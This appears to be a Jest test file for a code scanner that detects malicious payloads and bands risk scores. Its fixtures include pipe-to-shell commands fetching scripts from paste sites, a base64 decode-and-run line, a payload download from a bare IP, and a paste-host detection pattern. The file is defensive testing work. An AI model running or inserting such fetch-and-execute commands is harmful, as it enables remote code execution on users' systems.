import { sweepCodeStrings } from '../analyzers/payload';
import { calculateRiskScore, getRiskLevel } from '../scorer';
import { Finding, RiskSeverity } from '../types';

const finding = (severity: RiskSeverity, category: string): Finding => ({
  file: 'x.py',
  line: 1,
  column: 0,
  severity,
  category,
  description: '',
  codeSnippet: '',
  language: 'python',
});

describe('payload sweep in code files', () => {
  it('catches a remote pipe-to-shell hidden in a shell call', () => {
    const src = `import os\nos.system("curl https://glot.io/snippets/x/raw | bash")\n`;
    const found = sweepCodeStrings(src, 'setup.py', 'python');
    expect(found.length).toBeGreaterThan(0);
    expect(found[0].severity).toBe('high');
    expect(found[0].category).toBe('Remote Script');
  });

  it('flags the paste-site host as a suspicious download', () => {
    const src = `subprocess.run(["wget", "-qO-", "https://rentry.co/x/raw"])\n`;
    const found = sweepCodeStrings(src, 'setup.py', 'python');
    expect(found.map((f) => f.category)).toContain('Suspicious Download');
  });

  it('catches a decode-and-run payload as critical', () => {
    const src = `subprocess.run("echo aGVsbG8= | base64 -d | sh", shell=True)\n`;
    const found = sweepCodeStrings(src, 'setup.py', 'python');
    expect(found.some((f) => f.severity === 'critical')).toBe(true);
  });

  it('catches a bare IP address', () => {
    const src = `requests.get("http://203.0.113.9/payload.sh")\n`;
    expect(sweepCodeStrings(src, 'run.py', 'python')).toHaveLength(1);
  });

  it('leaves ordinary URLs, loopback and private addresses alone', () => {
    const src = [
      `requests.get("https://api.github.com/repos/x/y/releases")`,
      `requests.get("http://127.0.0.1:8000/health")`,
      `requests.get("http://192.168.1.10:5000/data")`,
    ].join('\n');
    expect(sweepCodeStrings(src, 'run.py', 'python')).toEqual([]);
  });

  it('does not fire on the scanner own rule definitions', () => {
    const src = `const DROP_HOSTS = String.raw\`(?:glot\\.io|pastebin\\.com)\`;`;
    expect(sweepCodeStrings(src, 'rules.ts', 'typescript')).toEqual([]);
  });
});

describe('severity bands', () => {
  it('puts a single HIGH threat in the HIGH band, not one below it', () => {
    const score = calculateRiskScore([finding('high', 'Suspicious Download')], []);
    expect(getRiskLevel(score)).toBe('high');
  });

  it('puts a single CRITICAL threat in the CRITICAL band', () => {
    const score = calculateRiskScore([finding('critical', 'Data Exfiltration')], []);
    expect(getRiskLevel(score)).toBe('critical');
  });

  it('still keeps a lone capability out of the threat bands', () => {
    const score = calculateRiskScore([finding('critical', 'Shell Execution')], []);
    expect(getRiskLevel(score)).toBe('medium');
  });
});
